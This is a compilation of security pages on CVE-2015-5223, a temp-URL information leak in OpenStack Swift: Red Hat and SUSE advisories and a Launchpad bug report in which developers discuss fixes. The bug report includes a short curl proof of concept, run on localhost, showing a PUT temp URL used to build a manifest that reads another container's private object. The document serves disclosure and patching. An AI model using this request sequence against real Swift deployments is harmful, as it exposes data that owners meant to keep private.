[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from rhn.redhat.com_8b4eede2_20250125_055203.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2015:1895 - Security Advisory

Issued:
2015-10-15
Updated:
2015-10-15
# RHSA-2015:1895 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Moderate: openstack-swift security update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2015%3A1895)

## Topic

Updated openstack-swift packages that fix one security issue are now
available for Red Hat Enterprise Linux OpenStack Platform 5.0, 6.0, and
7.0.

Red Hat Product Security has rated this update as having Moderate security
impact. A Common Vulnerability Scoring System (CVSS) base score, which
gives a detailed severity rating, is available from the CVE link in the
References section.

## Description

OpenStack Object Storage (swift) provides object storage in virtual
containers, which allows users to store and retrieve files (arbitrary
data). The service's distributed architecture supports horizontal scaling;
redundancy as failure-proofing is provided through software-based data
replication. Because Object Storage supports asynchronous eventual
consistency replication, it is well suited to deployment in multiple
data centers.

A flaw was found in the OpenStack Object storage service (swift)
tempurls. An attacker in possession of a tempurl key with PUT permissions
may be able to gain read access to other objects in the same project.
(CVE-2015-5223)

Red Hat would like to thank the OpenStack project for reporting this
issue. Upstream acknowledges Richard Hawkins of Rackspace, and the
OpenStack Swift core reviewers as the original reporters.

All users of openstack-swift are advised to upgrade to these updated
packages, which correct this issue. After installing this update, the
OpenStack Object Storage services will be restarted automatically.

## Solution

Before applying this update, ensure all previously released errata
relevant to your system have been applied.

For details on how to apply this update, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat OpenStack 7 x86\_64
* Red Hat OpenStack 6.0 x86\_64
* Red Hat OpenStack 5.0 for RHEL 7 x86\_64
* Red Hat OpenStack 5.0 for RHEL 6 x86\_64

## Fixes

* [BZ - 1255622](https://bugzilla.redhat.com/show_bug.cgi?id=1255622)
  - CVE-2015-5223 openstack-swift: Information leak via Swift tempurls

## CVEs

* [CVE-2015-5223](https://www.redhat.com/security/data/cve/CVE-2015-5223.html)

## References

* <http://www.redhat.com/security/updates/classification/#normal>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat OpenStack 7

| SRPM | |
| --- | --- |
| openstack-swift-2.3.0-2.el7ost.src.rpm | SHA-256: 71367d979aa9d5e73f2574f37e802aa2973f486aec3fb18d124d361502600ba7 |
| x86\_64 | |
| openstack-swift-2.3.0-2.el7ost.noarch.rpm | SHA-256: a91aa2b18fc22654c80f67e2e61aeb96b0805288889ed4cdb769e45dd8b278cb |
| openstack-swift-account-2.3.0-2.el7ost.noarch.rpm | SHA-256: f3d60382f28a6d55a6f973f2245c76be8b589ce3f98337aa274d5b39dad31419 |
| openstack-swift-container-2.3.0-2.el7ost.noarch.rpm | SHA-256: 8ede2b9e18bed77e2b923f01a330d1ff4efb9f0dcbc1887aa327f4b06dcca7ea |
| openstack-swift-doc-2.3.0-2.el7ost.noarch.rpm | SHA-256: e2c1e1937b4ca9641fef9a6f7d7776631250635bc88999275cc162e1b3c1333b |
| openstack-swift-object-2.3.0-2.el7ost.noarch.rpm | SHA-256: 97323aa83a9e55414ab0af4b0059fe8eb55440908d86acb962b1e6cbc8519aee |
| openstack-swift-proxy-2.3.0-2.el7ost.noarch.rpm | SHA-256: f110d43ec74236e70b25483b53d2745c5b77be6e07cc1f213dda3372f10eb655 |

## Red Hat OpenStack 6.0

| SRPM | |
| --- | --- |
| openstack-swift-2.2.0-5.el7ost.src.rpm | SHA-256: b8ab7b53b7b1b8e3b2ee39ad8d128fff208a4dced34898c17f812b18f484faa8 |
| x86\_64 | |
| openstack-swift-2.2.0-5.el7ost.noarch.rpm | SHA-256: 9e886dacee9506a9b952f32a2571176f681dbc5e76e649b2c48daeff16a83680 |
| openstack-swift-account-2.2.0-5.el7ost.noarch.rpm | SHA-256: 0ac6b70d75711c3f6ae0c41a6291df15f734e50ab5b0757e63a8c93ba09f8c20 |
| openstack-swift-container-2.2.0-5.el7ost.noarch.rpm | SHA-256: db9f285cded4c96b2f208ac98beae74806d5e3af5c6b682cd42636a2aef57e67 |
| openstack-swift-doc-2.2.0-5.el7ost.noarch.rpm | SHA-256: 358e5369223090dbd8437a7013b344aaa31aab6688f677bd79ebe8599726ce6c |
| openstack-swift-object-2.2.0-5.el7ost.noarch.rpm | SHA-256: 3841270c2d3290bb2ac280ddd2cc550284114abad8fefc8eae83f670b10796be |
| openstack-swift-proxy-2.2.0-5.el7ost.noarch.rpm | SHA-256: 1dcbc2ca73246923f5ac8dada2209d7d753b3d86cec61ba07ee50c9d17d41dad |

## Red Hat OpenStack 5.0 for RHEL 7

| SRPM | |
| --- | --- |
| openstack-swift-1.13.1-7.el7ost.src.rpm | SHA-256: 70dd1341d116317ab46921a11658043a8d9d4d08c11307b61335c7ab49b6b0ce |
| x86\_64 | |
| openstack-swift-1.13.1-7.el7ost.noarch.rpm | SHA-256: 8bfeace9feba3b343bb34000dc38d81d9113c9019a7b55aca25498c616ba5f69 |
| openstack-swift-account-1.13.1-7.el7ost.noarch.rpm | SHA-256: 8f18e820df4825ab619b0befd1e04846813c51b504c8f1c576d1e2a5ac396b34 |
| openstack-swift-container-1.13.1-7.el7ost.noarch.rpm | SHA-256: b329ec276cac5cff56ef02af8d96cbd30abccbadae68ad9bbbc20ccdfc859412 |
| openstack-swift-doc-1.13.1-7.el7ost.noarch.rpm | SHA-256: 0b1db9859ff5bc8686d42b265aa776eb0c469559f528f72ba774b95f92672fbc |
| openstack-swift-object-1.13.1-7.el7ost.noarch.rpm | SHA-256: 1cab025778c32e5f44d6f4295325772a27d37c0f045b1c5ceb3b932066085ebd |
| openstack-swift-proxy-1.13.1-7.el7ost.noarch.rpm | SHA-256: 0746959cebdde4e7ca508c65fccbd4d8171a90ca6454302867228458e1561e74 |

## Red Hat OpenStack 5.0 for RHEL 6

| SRPM | |
| --- | --- |
| openstack-swift-1.13.1-7.el6ost.src.rpm | SHA-256: 12a2e61da6d86607ca7b8bd66d570c01607412a5ff54536f726fa04f077286b0 |
| x86\_64 | |
| openstack-swift-1.13.1-7.el6ost.noarch.rpm | SHA-256: 19da07c675f77407060895731d653ed262eb427c8c0e8ec2cdb21edf42b46feb |
| openstack-swift-account-1.13.1-7.el6ost.noarch.rpm | SHA-256: b7d18206eec792e4ed6e0c6d5171a0431d291b3781f188c891fc0a7b9746e48c |
| openstack-swift-container-1.13.1-7.el6ost.noarch.rpm | SHA-256: fc22a1fcb0e14dbecffac3f184a437ab9bf68175a849d3dfa805515304f752e5 |
| openstack-swift-doc-1.13.1-7.el6ost.noarch.rpm | SHA-256: 7cd87fb27833f59c3b24e510b3d8e3549fb193c2da3a724ad28158ea5262a469 |
| openstack-swift-object-1.13.1-7.el6ost.noarch.rpm | SHA-256: 9bf9296c26194dda87e9e0a545daa37afd63996d650f78cf661c231bda43933f |
| openstack-swift-proxy-1.13.1-7.el6ost.noarch.rpm | SHA-256: 27d2dff3a29b182b68a8db39406067629930b6933fbc73060566c21cd05fc453 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from lists.opensuse.org_a3b332f1_20250125_055202.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/#XIN2LLC73UU75SS3S3CAJTAESRQMO7AD)

# [security-announce] SUSE-SU-2015:1846-1: important: Security update for openstack-swift

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

30 Oct
2015

30 Oct
'15

11:09

SUSE Security Update: Security update for openstack-swift
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2015:1846-1
Rating: important
References: #900253 #927793 #942641
Cross-References: CVE-2014-7960 CVE-2015-1856 CVE-2015-5223
Affected Products:
SUSE OpenStack Cloud 5
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes three vulnerabilities is now available.
Description:
openstack-swift was updated to fix three security issues.
These security issues were fixed:
- CVE-2015-1856: OpenStack Object Storage (Swift), when allow\_version is
configured, allowed remote authenticated users to delete the latest
version of an object by leveraging listing access to the
x-versions-location container (bsc#927793).
- CVE-2014-7960: OpenStack Object Storage (Swift) allowed remote
authenticated users to bypass the max\_meta\_count and other metadata
constraints via multiple crafted requests which exceed the limit when
combined (bsc#900253).
- CVE-2015-5223: Information leak via Swift tempurls (bsc#942641).
Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE OpenStack Cloud 5:
zypper in -t patch sleclo50sp3-openstack-swift-12171=1
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE OpenStack Cloud 5 (x86\_64):
openstack-swift-2.1.0-11.1
openstack-swift-account-2.1.0-11.1
openstack-swift-container-2.1.0-11.1
openstack-swift-object-2.1.0-11.1
openstack-swift-proxy-2.1.0-11.1
python-swift-2.1.0-11.1
- SUSE OpenStack Cloud 5 (noarch):
openstack-swift-doc-2.1.0-11.1
References:
<https://www.suse.com/security/cve/CVE-2014-7960.html>
<https://www.suse.com/security/cve/CVE-2015-1856.html>
<https://www.suse.com/security/cve/CVE-2015-5223.html>
<https://bugzilla.suse.com/900253>
<https://bugzilla.suse.com/927793>
<https://bugzilla.suse.com/942641>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/XIN2LLC73UU75SS3S3CAJTAESRQMO7AD/#XIN2LLC73UU75SS3S3CAJTAESRQMO7AD)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugs.launchpad.net_8cd79ac0_20250125_055208.html ===

[Log in / Register](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Blogin)

[![](https://launchpadlibrarian.net/52141984/os64.png)](https://launchpad.net/swift)

## [OpenStack Object Storage (swift)](https://launchpad.net/swift)

* [Overview](https://launchpad.net/swift)
* [Code](https://code.launchpad.net/swift)
* [Bugs](https://bugs.launchpad.net/swift)
* [Blueprints](https://blueprints.launchpad.net/swift)
* [Translations](https://translations.launchpad.net/swift)
* [Answers](https://answers.launchpad.net/swift)

# Container level temp URLs can unintentionally leak data.

Bug #1449212 reported by
[Richard Hawkins](https://launchpad.net/~richard-hawkins)
on 2015-04-27

[262](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Object Storage (swift)](https://bugs.launchpad.net/swift) | Fix Released | Critical | Unassigned | [OpenStack Object Storage (swift) 2.4.0](https://launchpad.net/swift/%2Bmilestone/2.4.0) |
| Declined for Juno by [John Dickinson](https://launchpad.net/~notmyname) | | | | | |
|  | [Kilo](https://bugs.launchpad.net/swift/kilo) | Fix Committed | Undecided | Unassigned |  |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Medium | [Tristan Cacqueray](https://launchpad.net/~tristan-cacqueray) |  |

### Bug Description

A user, using a container level temp URL key, can create a PUT temp URL and create a DLO/SLO that references objects in another container, potentially leaking information that was intended to be private.

Example:

# Create object in container with secrets

$ curl -i -XPUT -H'x-auth-token: AUTH\_tkbfc02e65fe184fa88500de6e9293dced' <http://127.0.0.1:8080/v1/AUTH_test/secrets/foo.txt> --data "12345"

HTTP/1.1 201 Created

Last-Modified: Mon, 27 Apr 2015 18:34:45 GMT

Content-Length: 0

Etag: 827ccb0eea8a706c4c34a16891f84e7b

Content-Type: text/html; charset=UTF-8

X-Trans-Id: txdb50279b32684c198a1e5-00553e8144

Date: Mon, 27 Apr 2015 18:34:44 GMT

# Create PUT temp URL, and create DLO pointing to "secret" container.

$ curl -i -XPUT <http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt>\?temp\_url\_sig\=b3b1a841a9262bbaa6eb546e5c2054be17377be5\;temp\_url\_expires\=1430160082 -H'X-Object-Manifest: secrets/f' -H'Content-Length: 0'

HTTP/1.1 201 Created

Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT

Content-Length: 0

Etag: d41d8cd98f00b204e9800998ecf8427e

Content-Type: text/html; charset=UTF-8

X-Trans-Id: txf89037608c7a461f9f6f1-00553e81d3

Date: Mon, 27 Apr 2015 18:37:07 GMT

# GET secrets using temp URL

$ curl -i <http://127.0.0.1:8080/v1/AUTH_test/container_a/uhoh.txt>\?temp\_url\_sig\=25d3740e42b56cbbaae15094bfc2a4f3ce3def86\;temp\_url\_expires\=1430160141

HTTP/1.1 200 OK

Content-Length: 5

Accept-Ranges: bytes

X-Object-Manifest: container\_b/f

Last-Modified: Mon, 27 Apr 2015 18:37:08 GMT

Etag: "1f32aa4c9a1d2ea010adcf2348166a04"

X-Timestamp: 1430159827.15679

Content-Type: text/plain

Content-Disposition: attachment; filename="uhoh.txt"; filename\*=UTF-8''uhoh.txt

X-Trans-Id: txbfe86e01cdef48caaeac2-00553e81ea

Date: Mon, 27 Apr 2015 18:37:30 GMT

12345%

Tags:

[in-feature-crypto](/swift/%2Bbugs?field.tag=in-feature-crypto)
[in-feature-hummingbird](/swift/%2Bbugs?field.tag=in-feature-hummingbird)
[tempurl](/swift/%2Bbugs?field.tag=tempurl)

## CVE References

* [2015-5223](/bugs/cve/2015-5223 "OpenStack Object Storage (Swift) befo...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-04-27: |  |  | [#1](/swift/%2Bbug/1449212/comments/1) |
| --- | --- | --- | --- |

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

| **description**: | updated |
| --- | --- |
| Changed in ossa: | |
| **status**: | New → Incomplete |
| **description**: | updated |

[Christian Schwede (cschwede)](https://launchpad.net/~cschwede)
on 2015-04-27

| Changed in swift: | |
| --- | --- |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-04-27: |  |  | [#2](/swift/%2Bbug/1449212/comments/2) |
| --- | --- | --- | --- |

Tested, and I can confirm this bug.

A possible bugfix might be something like this:

- set an internal flag if tempurl middleware validates a request using a container key

- check this flag in the slo/dlo middleware, and if set ensure access is only granted to segments within the same container like the original request

Any other ideas? Does that make sense? I can attach a patch tomorrow if this makes sense to anyone.

Tested, and I can confirm this bug.
A possible bugfix might be something like this:
- set an internal flag if tempurl middleware validates a request using a container key
- check this flag in the slo/dlo middleware, and if set ensure access is only granted to segments within the same container like the original request
Any other ideas? Does that make sense? I can attach a patch tomorrow if this makes sense to anyone.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Samuel Merritt (torgomatic)](https://launchpad.net/~torgomatic) wrote on 2015-04-27: |  |  | [#3](/swift/%2Bbug/1449212/comments/3) |
| --- | --- | --- | --- |

You could probably get a similar effect by having tempurl set a swift.authorize callback that limits you to the appropriate scope (account or container), depending on where the key came from.

You could probably get a similar effect by having tempurl set a swift.authorize callback that limits you to the appropriate scope (account or container), depending on where the key came from.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-04-27: |  |  | [#4](/swift/%2Bbug/1449212/comments/4) |
| --- | --- | --- | --- |

what are the privileges required to set a container tempurl key? If you have to be a swift\_owner to set or read a container tempurl key then you already have privileges that you could theoretically elevate to - and this maybe more of a documentation issue. IIRC, account level tempurl keys allow you to grant temporary access to a manifest object regardless of the location of it's segment - so I think there's a strong analogy - and even if you hand out a PUT tempurl, and let someone create a cross-container manifest they'd still need to generate a GET tempurl to read cross container.

If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.

OTOH, perhaps regardless of the privilege level of the \*expected\* recipient of the key if the user story is that the attack surface of a tempurl key is reduced by restricting it to the container vs the account we may have to pursue a solution to limit the "pre-authorization" of requests to paths under the pre-authorized container. Perhaps leave a authorization callback in the environment and have it return 401 if the container in the path isn't the container who matched originally matched the tempurl key?

It seems like we need to understand the user expectation first. It may be surprising if you can \*make\* a tempurl for a segmented object - but can't acctually \*use\* it because the segments were in a different container? If we give out a tempurl for a PUT to overwrite an object in a versioned container - do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

what are the privileges required to set a container tempurl key? If you have to be a swift\_owner to set or read a container tempurl key then you already have privileges that you could theoretically elevate to - and this maybe more of a documentation issue. IIRC, account level tempurl keys allow you to grant temporary access to a manifest object regardless of the location of it's segment - so I think there's a strong analogy - and even if you hand out a PUT tempurl, and let someone create a cross-container manifest they'd still need to generate a GET tempurl to read cross container.
If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.
OTOH, perhaps regardless of the privilege level of the \*expected\* recipient of the key if the user story is that the attack surface of a tempurl key is reduced by restricting it to the container vs the account we may have to pursue a solution to limit the "pre-authorization" of requests to paths under the pre-authorized container. Perhaps leave a authorization callback in the environment and have it return 401 if the container in the path isn't the container who matched originally matched the tempurl key?
It seems like we need to understand the user expectation first. It may be surprising if you can \*make\* a tempurl for a segmented object - but can't acctually \*use\* it because the segments were in a different container? If we give out a tempurl for a PUT to overwrite an object in a versioned container - do we expect using the tempurl to PUT new data to be able to backup the existing object before the overwrite?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Richard Hawkins (richard-hawkins)](https://launchpad.net/~richard-hawkins) wrote on 2015-04-27: |  |  | [#5](/swift/%2Bbug/1449212/comments/5) |
| --- | --- | --- | --- |

> what are the privileges required to set a container tempurl key?

As far as I know, you have to be swift\_owner or a sub user with admin privileges to set/read the container level keys.

> If we expect that container tempurl \*keys\* to be handed out to people that have a more restricted access than that - well that's probably different - object versioning would be the next most likely attack vector.

I personally think container level temp URLs are similar to a ACL on a container. If I were a user, I would assume that if I created a key for a container level temp URL, and gave it out to a user, that they would only have access to read/write to that container. Just as if I had added them to an ACL for a container.

